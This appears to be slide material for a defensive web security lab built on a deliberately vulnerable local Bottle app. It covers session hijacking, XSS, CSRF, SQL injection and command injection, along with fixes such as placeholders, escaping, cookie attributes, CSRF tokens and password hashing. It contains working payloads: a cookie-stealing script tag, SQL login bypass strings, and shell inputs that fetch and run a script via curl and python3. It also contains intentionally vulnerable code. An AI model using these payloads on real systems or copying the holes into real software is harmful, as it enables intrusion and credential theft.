# Web Application Security Implementation Lab

Local experiments for seeing where web application boundaries break.

- Observe vulnerability behavior in a local environment
- Connect each observation to a defensive implementation
- Break down countermeasures from attacker, developer, and operator perspectives
- Repository: `https://github.com/koide55/webapp-security-programming-handson`

---

# Why We Need Experiments

1. Know
   - Understand what kinds of input and requests attackers use.
2. Observe
   - Watch the moment dangerous boundaries break in Cookie, HTML, SQL, and shell contexts.
3. Prevent
   - Understand the difference between "working code" and "safe code" at implementation level.

This exercise is for defensive learning only. Do not use it on public servers or third-party services.

---

# Web Application Security Programming

- Observe common web application vulnerabilities in a local environment
- Inspect the implementation boundaries where attacks become possible
- Connect observed behavior to design, implementation, and operational mitigations
- Course repository: `https://github.com/koide55/webapp-security-programming-handson`

---

# Web Server Security

- Understand what kinds of input and requests attackers use
- Learn dangerous context boundaries: Cookie, HTML, SQL, and shell
- Use a local training app to move between vulnerability observation and mitigation
- This exercise is for defensive learning only; do not use it on public servers or third-party services

---

# Preparation: VS Code and Terminal

- The standard beginner editor for this course is Visual Studio Code
- Install Microsoft's Python extension
- Open the repository with `File` > `Open Folder...`
- Run commands from `Terminal` > `New Terminal`
- After setup, choose `.venv` when VS Code asks for the Python interpreter

Experienced participants may use their preferred editor, but instructor demos assume VS Code.

  - Lightweight web framework
  - `http://bottlepy.org/docs/dev/`
- Peewee
  - ORM for Python
  - `http://docs.peewee-orm.com/en/latest/`
- SQLite
  - SQL database engine

We use only these tools to build a lab for web application vulnerability experiments.

---

# Frameworks We Use Here

- Peewee maps Python models to SQLite tables
- SQLite stores users, sessions, and BBS comments in a local file
- The helper server is used only for local XSS, CSRF, and command-injection labs
- All experiments run on `localhost`

---

# Basic Exercise 2: Try Bottle

1. Clone the repository
2. Install dependencies in a Python virtual environment
3. Start the vulnerable training app
4. Open `http://localhost:8086/hello/security`
5. Find `@get("/hello/<name>")` in `app/main.py`

Point: a URL path parameter is passed into a Python function and rendered as HTML.

---

# Basic Exercise 2: Original Bottle Code

```python
from bottle import *

@route('/hello/<name>')
def index(name):
    return template('<b>Hello, {{name}}</b> !', name=name)

run(host='0.0.0.0', port=8089)
```

- The URL part `<name>` becomes a Python function argument
- `template(..., name=name)` passes the value into HTML
- In the current app, this corresponds to `@get("/hello/<name>")`

---

# Basic Exercise 2: Run the App

```bash
git clone https://github.com/koide55/webapp-security-programming-handson.git
cd webapp-security-programming-handson
python3 -m venv .venv
. .venv/bin/activate
python -m pip install -r requirements.txt
python app/main.py --reset-db
```

- Open `http://localhost:8086/hello/security`
- Check the route and return value in `app/main.py`

---

# Basic Exercise 2: Bottle Walkthrough

1. Start Python and enter the Bottle sample code.
2. Open the URL in a browser and confirm the response.

Key annotations:

- A GET request such as `/hello/something` invokes the routed method.
- The template creates the HTML returned to the browser.
- `run(host='0.0.0.0', port=8089)` starts the server loop.
- Entering a URL in the browser triggers the route and returns the result.

---

# Basic Exercise 2: Try Bottle

Launch Python and input the sample code.

- When a GET `/hello/something` request is sent, the next method is executed.
- The template creates the HTML returned to the browser.
- The web server main loop waits for requests.
- Enter a URL in the browser.
- Confirm that the response is returned.

---

# Basic Exercise 3: Try Peewee and SQLite

- `Users` and `Comments` models define database tables
- `initialize_database()` creates the tables and inserts seed users
- The app stores data in `app/data.db`
- Seed accounts:
  - `koide` / `password`
  - `alice` / `alice123`
  - `bob` / `bob123`

---

# Basic Exercise 3: Original Peewee Code

```python
from peewee import *

db = SqliteDatabase('data.db')

class Users(Model):
    username = CharField()
    password = CharField()
    class Meta:
        database = db

db.connect()
db.create_tables([Users])
Users(username='koide', password='abcd').save()
Users(username='hirosk', password='1234').save()
```

- `SqliteDatabase('data.db')` opens a SQLite file
- `Users(Model)` maps a Python class to a database table
- The current app adds `userid`, `cookie`, and `Comments`

---

# Basic Exercise 3: Inspect SQLite

```bash
sqlite3 app/data.db
.tables
.schema users
.schema comments
select userid, username, password, cookie from users;
.quit
```

- Compare model definitions with table definitions
- Notice that passwords are stored in plain text
- Separate "working implementation" from "safe implementation"

---

# Basic Exercise 3: Database Operations

- Peewee query example:
  - `Users.get_or_none(Users.username == "koide")`
- SQLite direct query example:
  - `select * from users where username='koide';`
- Compare ORM-generated access with hand-written SQL
- This difference becomes important in the SQL injection exercise

---

# Basic Exercise 3: Database Checkpoints

- `Users` stores users, passwords, and cookie-related values
- `Comments` stores BBS comments and authors
- `ForeignKeyField` connects comments to users
- Discussion: explain which data should be stored and which data should not

---

# Basic Exercise 3: Insert Data with Peewee

Flow in the original exercise:

1. Write the model code.
2. Run `python3.5 main.py`.
3. Create a database instance.
4. Connect to the database.
5. Create tables corresponding to models.
6. Create two user records and store them.

In the current app, the same idea is handled by `initialize_database()`.

---

# Basic Exercise 3: Try Peewee and SQLite

Original exercise flow:

- Input code that inserts data.
- Execute the script.
- Create a database model.
- Connect to the database.
- Create tables corresponding to the model.
- Create two sets of data and store them.
- Create an instance of the database.

---

# Basic Exercise 3: Direct Database Access

Original continuation:

- Access the database directly.
- Search data.
- Create a database instance.
- Define a model that maps a class to a table.
- Connect to the database.
- Look up a record whose username is `hirosk`.

---

# Basic Exercise 3: Direct Database Checkpoints

Using the SQLite command-line tool:

- Check which tables are defined.
- Display all rows in the `users` table.
- Compare what the app model says with what SQLite actually stores.
- Notice that the database does not know whether a stored password is safe.

---

# Session Hijacking Lab

- HTTP does not remember the user across requests by itself
- Login state is managed with cookies and server-side information
- If a cookie is stolen, another browser may impersonate the user
- This chapter observes what cookies do and how to protect them

---

# HTTP Review

1. The browser sends an HTTP request
2. The web server returns an HTTP response
3. The browser interprets HTML and displays the page

What to observe:

- URL
- HTTP method
- Form data
- Cookie
- Response body

---

# HTTP Is Stateless

- The first request and the second request are separate by default
- Even after login, the server needs information to know whether it is the same user
- Cookie-based session management is the common mechanism
- Mistakes in session management can lead to impersonation

---

# HTTP and the Memory-Loss Problem

- HTTP is stateless: every request is independent.
- A password check on one page does not automatically identify the same user on later pages.
- Web apps must build a stateful experience on top of stateless HTTP.
- Cookies are the common bridge between stateless requests and login state.

Core challenge: remember the user safely without trusting easily forged data.

---

# HTTP Review: Same Person Not Guaranteed

- A browser sends an HTTP request.
- A server returns an HTTP response.
- Another page request is a new interaction.
- Without a session mechanism, the server cannot assume it is the same user.

Even if a password was correct once, later pages need a reliable way to identify the user.

---

# Stateless and Stateful Example

- Stateless:
  - Each request stands alone.
  - The server does not remember past requests automatically.
- Stateful:
  - Past context affects the current response.
  - Examples: login state, carts, posted content, user preferences.

Reference: `http://yohei-y.blogspot.jp/2007/10/blog-post.html`

---

# HTTP Cookie (Session Management)

1. After authentication succeeds, create and store a session ID.
2. Attach the session ID to the HTTP response header.
3. The browser stores the session ID.
4. On later requests, the browser attaches the session ID.
5. The server compares the received session ID with the server-managed value.

If the values match, the server treats it as the same user.

---

# HTTP Cookie (Session Management)

- Authentication alone is not enough for later requests.
- A session ID connects later requests to the authenticated user.
- The browser automatically sends the cookie to the same site.
- The server must decide whether the session ID is valid.

The session ID becomes sensitive authentication material.

---

# Session Hijacking

- A user logs in and receives a session ID.
- The browser stores the session ID.
- If an attacker learns the session ID, the attacker can send it too.
- The server may welcome the attacker as the original user.

Session theft can bypass password authentication after login.

---

# Session Hijacking: If the ID Is Known

- The password was correct once, so the server registered a session ID.
- Later requests identify the user by session ID.
- If someone else can obtain that ID, the server may not distinguish them.
- The exercise shows this by copying cookie values between browsers.

Question: what should the server and browser do to reduce the damage?

---

# Stateless and Stateful

- Stateless:
  - Each request is processed independently
  - This is the basic nature of HTTP
- Stateful:
  - Past state affects current processing
  - Examples: login state, shopping carts, author identity
- Web apps build stateful experiences on top of stateless HTTP

---

# HTTP Cookie and Session Management

- After login, the server issues a session-related cookie
- The browser sends the cookie with later requests
- The server uses the cookie value to find the logged-in user
- If the cookie is predictable, stolen, or poorly protected, the session can be abused

---

# What Cookies Must Protect

- Session IDs must be sufficiently random
- Add cookie attributes when appropriate:
  - `HttpOnly`
  - `Secure`
  - `SameSite`
- Manage expiration and logout on the server side
- This material intentionally includes weak behavior so the differences are visible

---

# Session Hijacking

- A user logs in and receives a cookie
- An attacker obtains the cookie value
- The attacker sends requests with the stolen cookie
- If the server accepts it, the attacker is treated as the victim

Key idea: password authentication can be bypassed after the session is stolen.

---

# Session Hijacking: Exercise Focus

- A cookie after successful login becomes proof of identity
- Copying the cookie can reproduce login state in another browser
- Predictable cookie values, JavaScript-readable cookies, and weak leakage response are dangerous
- The exercise uses the app's Cookie page so students do not need browser developer tools

---

# Cookie and Session Management

Typical flow:

1. The user logs in with ID and password.
2. The server generates a session ID and returns it as a cookie.
3. Later requests include the cookie automatically.
4. The server uses the cookie to decide who the user is.

Insight: if the cookie can be copied, the system may treat the copier as the user.

---

# Observation 1: Session Hijacking

- Normal user:
  - Sends a request with the correct cookie.
  - Receives a personalized response.
- Attacker:
  - Sets and sends a stolen cookie.
  - The server trusts the cookie and welcomes the attacker as the original user.

Weakness: JavaScript-readable cookies and predictable session IDs can be critical risks.

---

- `app/views/bbs.tpl`
  - BBS HTML template
- `tools/attacker_server.py`
  - XSS receiver, CSRF page, and dummy payload distributor

---

# Database Configuration

```python
DBFILE = BASE_DIR / "data.db"
db = SqliteDatabase(str(DBFILE))

class Users(BaseModel):
    userid = PrimaryKeyField()
    username = CharField(null=True, unique=True)
    password = CharField(null=True)
    cookie = CharField(null=True)
```

- The SQLite file is `app/data.db`
- `--reset-db` initializes it

---

# Sign Up

Processing flow:

1. Receive `username` and `password` from the form
2. Check empty values and duplicate usernames
3. Save with `Users.create()`
4. Send the user to the login page

Observation points:

- The current app stores passwords in plain text
- The fix task considers password hashing

---

# Login

For the SQL injection exercise, the login implementation is intentionally vulnerable.

```python
sql = "SELECT * FROM users WHERE username='" + username + \
      "' and password='" + password + "';"
records = cursor.execute(sql)
```

- On success, the app issues a cookie
- The executed SQL is displayed so students can observe dangerous concatenation

---

# Logout and MyPage

- `/logout`
  - Deletes `cookie_id`
  - Returns to the login page
- `/mypage`
  - Finds the current user from the cookie
  - Asks for login if no user is found

Discussion:

- What is dangerous when the app relies only on cookie values?
- Where should session invalidation be managed?

---

# Basic Exercise 4: Session Hijacking

1. Log in as `koide` in a normal window
2. Log in as `alice` in another browser or incognito window
3. Open `http://localhost:8086/cookies` in each window
4. Copy the cookie and reload the other window
5. Observe how the displayed user changes

Goal: understand that cookies represent login state.

---

# Check Cookies in the Web App

Steps:

1. Log in
2. Open `Cookie` in the navigation
3. Look at `Cookie header`
4. Look at how `cookie_id` is shown
5. Compare values from different browsers

Values to check:

- The `cookie_id` stored in the browser
- The value the app uses after signature verification
- The corresponding user in the DB

---

# Advanced Exercise 5: Compare Signed Cookies

Observe these lines in `app/main.py`:

```python
response.set_cookie("cookie_id", cookie_id, secret=COOKIE_SECRET)
request.get_cookie("cookie_id", secret=COOKIE_SECRET)
```

Questions:

- With `secret`, can you simply rewrite the cookie to `user1`?
- What changes if `secret` is removed?
- What do `HttpOnly` and `SameSite` protect?

---

# XSS Lab

- A string posted to BBS is displayed as HTML
- If escaping is disabled, JavaScript inside a post can execute
- If JavaScript can read cookies, it may send them elsewhere
- The helper server gives us a local destination for the experiment

---

# BBS 1/3: Routing

```python
@get("/bbs")
def bbs_form():
    user = current_user()
    comments = Comments.select().order_by(Comments.commentid)
    return template("bbs", username=user.username, comments=comments)
```

- Get the logged-in user from the cookie
- Get comments from the database
- Pass username and comments to the template

---

# BBS 2/3: Posting

```python
@post("/bbs")
def post_bbs():
    user = current_user()
    comment = request.forms.decode().get("comment", "")
    Comments.create(user=user, comment=comment, datetime=now)
    redirect("/bbs")
```

- Save form input to the DB
- At this point the value is not HTML yet
- The dangerous context appears when the value is displayed

---

# BBS 3/3: Display

```html
{{!comment.comment}}
```

- `!` disables escaping in Bottle templates
- User input is interpreted as HTML
- This is intentionally left for the XSS exercise

Safer direction:

```html
{{comment.comment}}
```

---

# Cross-Site Scripting Attack

- The victim opens a trusted web page
- The trusted page includes attacker-controlled script
- The browser runs the script in the trusted page context
- Cookies, page content, and actions may be abused

Important: the script runs because the trusted site reflected or stored unsafe input.

---

# Cross-Site Scripting

- Attacker-controlled script is mixed into a site the user trusts
- The browser runs it as that site's script
- Cookies or on-screen information may be read
- The root cause is not merely "input"; it is the output context

---

# Observation 2: Cross-Site Scripting

Flow:

1. Input: a comment contains `<script>...`.
2. Storage: the app saves the comment without neutralizing it.
3. Execution: the victim's browser renders the stored comment as HTML.
4. Helper server: the script sends cookie data to a local receiver.

Root cause: output escaping was skipped, so data became executable code.

---

# Cross-Site Scripting Attack

- The user often visits a trusted web site.
- An attacker prepares a malicious site or payload.
- A malicious script is stored or reflected by the trusted site.
- Private information or actions may be sent to the attacker's site.

The browser executes the script in the trusted site's context.

---

# Cross-Site Scripting Attack Flow

- Trusted site: the place the user expects to be safe.
- Attacker-controlled script: the code mixed into the page.
- Victim browser: executes the script.
- Leakage: cookies, page content, or actions may be abused.

Defensive focus: escape output for the correct context and reduce cookie exposure.

---

# Inspect the HTML

Inspect the BBS output.

- Normal strings are displayed as text
- A posted `<script>` is interpreted as a tag
- `{{!comment.comment}}` allows dangerous output

Discussion:

- Should the app delete content on input, or escape it on output?
- Are the mitigations the same for HTML, attributes, and JavaScript?

---

# Simple Local Helper Server

```bash
. .venv/bin/activate
python tools/attacker_server.py
```

- `http://localhost:8090/`
  - Receives cookie strings and displays logs
- `http://localhost:8090/csrf`
  - CSRF exercise page
- `http://localhost:8090/badscript`
  - Harmless dummy payload

---

# A Simple Local Helper Site

- Run `tools/attacker_server.py`
- Use `http://localhost:8090/?cookie_id=...` as the XSS destination
- Received values are recorded in `stolen_cookies.log`
- This helper is for local classroom experiments only

---

# Reference: Delete Extra Comments

After the XSS exercise, you can delete posts directly from the DB.

```bash
sqlite3 app/data.db \
  "delete from comments where comment like '<script>%';"
```

Or initialize the DB:

```bash
python app/main.py --reset-db --init-only
```

---

# Basic Exercise 6: XSS

1. Log in to the web app and open BBS
2. Start the helper server
3. Post this comment

```html
<script>document.location="http://localhost:8090/?cookie_id="+document.cookie</script>
```

4. Check received values at `http://localhost:8090`
5. Explain why the cookie was readable

---

# Advanced Exercise 7: Explain XSS

Research and explain:

- The role of the helper server
- The role of SQLite
- The dangerous point in the BBS template
- The role of cookie attributes
- The meaning of output escaping

Summarize in a table: root cause, observed behavior, mitigation.

---

# CSRF Lab

- The browser automatically attaches cookies to requests for the target site
- A form on another site can still POST to the target site
- If the server does not verify the action came from the legitimate page, unintended actions can succeed
- We observe this with BBS posting

---

# Cross-Site Request Forgery

1. The user is logged in to BBS
2. The same browser opens another site
3. The other site submits a POST form to BBS
4. The browser automatically attaches the BBS cookie
5. If BBS does not verify the request, the post succeeds

Mitigations: CSRF tokens, Origin/Referer checks, SameSite cookies.

---

# Observation 3: Cross-Site Request Forgery

Observed behavior:

- A malicious page opened in another tab can trigger a POST to BBS.
- The browser automatically attaches cookies for the target site.
- The server receives a request that looks authenticated.

Mitigation: verify that the request really came from a legitimate page using an unpredictable token.

---

# Cross-Site Request Forgery

- The browser stores the session ID.
- The user is lured to a malicious page.
- The malicious page contains a form or script that submits to the legitimate site.
- The browser automatically sends the legitimate site's cookie.
- If the server does not verify the source, the action succeeds.

---

# Helper Server: CSRF Page

`/csrf` in `tools/attacker_server.py`:

```python
@get("/csrf")
def csrf_page():
    return page("CSRF Demo", """
      <form action="http://localhost:8086/bbs" method="post">
        <input type="hidden" name="comment" value="[CSRF] ...">
        <button type="submit">Submit</button>
      </form>
    """)
```

---

# CSRF Page HTML

```html
<form action="http://localhost:8086/bbs" method="post">
  <input type="hidden" name="token" value="a73+f*&t5">
  <input type="hidden" name="comment" value="[CSRF] Posted from helper site">
  <button type="submit">Submit</button>
</form>
```

- A fixed token is not a defense
- The server must verify an unpredictable token

---

# Basic Exercise 8: CSRF

1. Start the web app
2. Start the helper server
3. Stay logged in to BBS
4. Open `http://localhost:8090/csrf` in the same browser
5. Press the button
6. Check BBS

Discussion: why was the cookie sent even though the post came from another site?

---

# SQL Injection Lab

- Start from safe ORM usage, then observe dangerous string-concatenated SQL
- User input is interpreted as part of the SQL statement
- On the login page, compare input values with the executed SQL
- Connect the observation to a placeholder-based fix task

---

# Observation 4: SQL Injection

Example attack:

```sql
WHERE username='' or 'a'='a';
```

- `'a'='a'` is always true.
- The password check logic is broken.
- Data changed the structure of the SQL query.

Insight: developer-intended logic can be rewritten by simple data when boundaries are not protected.

---

# Deliberately Vulnerable Design

Safer directions:

- Use ORM condition expressions
- Use placeholders
- Separate input values from SQL structure

Dangerous direction for the exercise:

- Build SQL strings manually
- Concatenate user input directly
- Display errors or executed SQL for observation

---

# Make Login Vulnerable

```python
username = request.forms.decode().get("username", "")
password = request.forms.decode().get("password", "")

sql = "SELECT * FROM users WHERE username='" + username + \
      "' and password='" + password + "';"
records = cursor.execute(sql)
```

- Input can break SQL syntax
- `app/main.py` keeps this implementation for the exercise

---

# Basic Exercise 9: SQL Injection

Try these on the login page:

```text
username: koide
password: ' or 'a'='a

username: koide' --
password: anything
```

Check:

- The executed SQL shown on screen
- Why authentication succeeded
- What changes when placeholders are used

---

# Command Injection Lab

- The contact form intentionally uses a dangerous shell call
- User input is interpreted as part of an OS command
- The exercise uses only harmless file creation and dummy payloads
- Real applications should use dedicated libraries instead of `os.system()`

---

# Observation 5: Command Injection

Example boundary break:

```sh
echo 'message' >> mail.txt ; curl -s http://localhost:8090/badscript -o bad.py ; python3 bad.py
```

- `;` ends the intended command and starts another command.
- User input is interpreted as shell syntax, not as text.
- The attacker-controlled command runs after the original command.

---

# Command Injection

Dangerous flow:

1. A user submits a web form
2. The app concatenates the input into a shell command
3. The shell interprets delimiters and quotes
4. An unexpected command runs

Point: as with SQLi and XSS, data is interpreted as code.

---

# Boundary Between Data and Commands

Examples of dangerous characters:

- `"`
- `;`
- `|`
- `&`
- `#`

These are not just text for the shell. They have syntax meaning.

Mitigation: avoid the shell, pass arguments as arrays, and use dedicated APIs.

---

# Safer Implementation Thinking

Avoid:

```python
os.system("command " + user_input)
```

Choose:

```python
subprocess.run(["command", user_input], shell=False)
```

Better:

- `smtplib` for email
- `pathlib` for files
- Placeholders or ORM APIs for DB operations

---

# Vulnerable Contact Form

```python
command = f'/bin/echo "From: {address}\n{comment}" >> "{OUTBOX_FILE}"'
exit_code = os.system(command)
```

- `comment` is interpreted by the shell
- A mail library or file API should be used instead
- The exercise displays the executed command so the broken boundary is visible

---

# Dummy Payload Distribution

Helper server `/badscript`:

```python
Path("badscript_ran.txt").write_text(
    "dummy payload executed\n",
    encoding="utf-8",
)
```

- It only creates a harmless file
- It safely demonstrates a "download and execute" flow through command injection

---

# Preparation Check

URLs:

- Web app: `http://localhost:8086`
- Helper server: `http://localhost:8090`
- Dummy payload: `http://localhost:8090/badscript`

Files to check:

- `app/data.db`
- `app/mail_outbox.txt`
- `stolen_cookies.log`
- `badscript_ran.txt`

---

# Observe Command Injection

Input example for the contact form message:

```text
"; /bin/echo injected > command_injection_result.txt; #
```

Example using the helper server:

```text
"; curl -s http://localhost:8090/badscript -o downloaded_badscript.py; python3 downloaded_badscript.py; #
```

Do not run this outside the local exercise.

---

# Command Injection Mitigations

- Do not call a shell in the first place
- Do not build commands through string concatenation
- Use `shell=False` and argument arrays
- Do not treat input as command syntax
- Minimize execution and file permissions
- Log execution details and detect abnormal behavior

---

# Basic Exercise 10: Command Injection

1. Log in to the web app
2. Open `/contact`
3. Try the harmless file-creation example
4. Read the command displayed on screen
5. Refactor the implementation so it does not use `os.system()`

Discussion:

- Which characters were interpreted as shell syntax?
- Where should input and command be separated?

---

# Integrated Matrix: Vulnerability Landscape

- XSS: browser target; missing output escaping; defend with escaping and `HttpOnly`.
- CSRF: browser-behavior target; missing request-origin verification; defend with tokens and `SameSite`.
- SQL injection: database target; string-concatenated SQL; defend with placeholders and binding.
- Command injection: OS/shell target; shell interpretation of input; defend by avoiding the shell.

Synthesis insight: the shared root cause is a boundary failure where data is interpreted as code.

# Improve Visibility: UI and Security

- Unstyled HTML can make vulnerability behavior hard to observe.
- Structured UI makes inputs, errors, and navigation clearer.
- Pico.css lets us improve visibility without adding a large UI framework.
- Keep security logic and UI cleanup separated.

Goal: make attack observation and defensive retesting easier for students.

---

# Clean Up the UI with Pico.css

- Usable UI matters even in security exercises
- Clear input fields, error messages, and navigation make observation easier
- Use Pico.css instead of a large UI kit
- One stylesheet on semantic HTML improves forms and tables

---

# Why Pico.css

- Start with one `link`
- No need to memorize many class names
- `label`, `input`, `button`, `table`, and `nav` look reasonable by default
- It fits Bottle's simple templates
- It keeps UI cleanup separate from security mitigations

---

# Directory Layout

Pico.css sample:

```text
app/
  static/
    app.css
  main.py
  views/
    base.tpl
    login.tpl
examples/
  pico-css/
```

Sample code is in `examples/pico-css/`.

---

# Add Static File Serving to main.py

```python
from bottle import static_file

@get("/static/<filepath:path>")
def static_files(filepath):
    return static_file(filepath, root=str(BASE_DIR / "static"))
```

Move the login page to a template:

```python
@get("/login")
def login_form():
    return template("login", error=None)
```

---

# base.tpl

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@picocss/pico@2/css/pico.min.css">
  <link rel="stylesheet" href="/static/app.css">
  <title>{{title or "WebApp Security"}}</title>
</head>
<body>
  <main class="container">{{!base}}</main>
</body>
</html>
```

---

# login.tpl

```html
% rebase("base.tpl", title="Login")

<article>
  <h1>Login</h1>
  % if error:
    <p role="alert" class="notice-error">{{error}}</p>
  % end
  <form action="/login" method="post">
    <label>Username <input name="username" required></label>
    <label>Password <input name="password" type="password" required></label>
    <button type="submit">Login</button>
  </form>
</article>
```

Pico.css styles form elements automatically.

# Basic Exercise 11: Improve the UI with Pico.css

1. Review the sample in `examples/pico-css/`
2. Add `static/app.css` and `views/base.tpl`
3. Move the `login` page into a template
4. Gradually move other pages into templates
5. After UI cleanup, check how SQLi, XSS, and CSRF behavior changes
6. In Advanced Exercises 12-18, implement vulnerability mitigations one by one

Final goal: grow a working app into material that can explain security clearly.

---

# Advanced Exercises 12-18: Fix Tasks

Implement these mitigations one at a time and confirm that the attack no longer works.

- Replace login SQL with placeholders
- Enable HTML escaping in the BBS display
- Add `HttpOnly` and `SameSite=Lax` to the cookie
- Generate a CSRF token per session and verify it on POST
- Remove `os.system()` from `/contact`
- Store hashed passwords

---

# Defensive Implementation: The Antidotes

- SQLi:
  - Stop string concatenation; use placeholders or ORM conditions.
- XSS:
  - Enable HTML escaping in template output.
- Session protection:
  - Add cookie attributes such as `HttpOnly` and `SameSite=Lax`.
- CSRF:
  - Generate unpredictable tokens and verify them on POST.
- Command injection:
  - Remove OS shell calls; use APIs or argument arrays.

---

# Deep Dive: Secure Password Storage

Flow:

1. Start with a cleartext password.
2. Add a unique random salt.
3. Run a slow password hashing algorithm such as PBKDF2, Argon2, or bcrypt.
4. Store an encoded string that includes method, cost, salt, and hash.

Problem: if the DB leaks, cleartext storage exposes all users immediately.

---

# Store Passwords as Hashes

- Do not store passwords in plain text
- Do not use simple SHA-256; use a salted, intentionally expensive method
- In production, prefer Argon2, bcrypt, or scrypt
- For this minimal exercise, `hashlib.pbkdf2_hmac()` can be used
- Store algorithm, iteration count, salt, and digest together

At login time, fetch by username and verify the submitted password with `verify_password()`.

---

# Separate Answers and Instructor Hints

- Student exercises: `docs/exercises.en.md`
- Advanced tasks: `docs/advanced-tasks.en.md`
- Security map: `docs/security-notes.en.md`
- Example answers: `docs/solutions.en.md`
- Instructor hints: `docs/instructor-hints.en.md`

During the exercise, do not show answers immediately. Use instructor hints for gradual support.

---

# Cleanup and Windows Support

Files generated during exercises:

- `app/data.db`
- `app/mail_outbox.txt`
- `stolen_cookies.log`
- `command_injection_result.txt`
- `downloaded_badscript.py`
- `badscript_ran.txt`

Most Windows environments do not include `make`, so use:

```powershell
py tools/clean.py
```

---

# Wrap-up

- Web app vulnerabilities often appear where input is interpreted in another context
- Cookie, HTML, SQL, shell, and password storage each require different defenses
- Observe first, then fix, so you can explain what the mitigation changes
- End by summarizing root cause, observed behavior, and mitigation in a table

---

# Summary and Golden Rules

Rule 1: understand the context.

- Where will this data be interpreted: HTML, SQL, or OS shell?

Rule 2: preserve the boundary between data and code.

- Never treat user input as executable structure.
- Use placeholders, escaping, and safe APIs.

Rule 3: compensate for HTTP's stateless nature.

- Use strict session management and request verification.

Cleanup: stop the lab environment and run `py tools/clean.py`.
